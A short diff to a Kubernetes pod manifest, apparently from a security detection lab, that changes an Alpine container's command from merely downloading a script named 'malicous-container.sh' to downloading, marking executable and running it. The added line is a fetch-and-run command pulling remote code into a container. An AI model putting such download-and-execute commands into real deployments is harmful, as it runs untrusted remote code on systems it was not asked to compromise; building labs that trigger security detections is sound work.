@@ -8,4 +8,4 @@ spec:
   containers:
   - name: alpine
     image: alpine:latest
-    command: ["/bin/sh", "-c", "wget -q https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/malicous-container/malicous-container.sh -O virus.sh && sleep 3600"]
+    command: ["/bin/sh", "-c", "wget -q https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/malicous-container/malicous-container.sh -O virus.sh && chmod +x virus.sh && ./virus.sh && sleep 3600"]
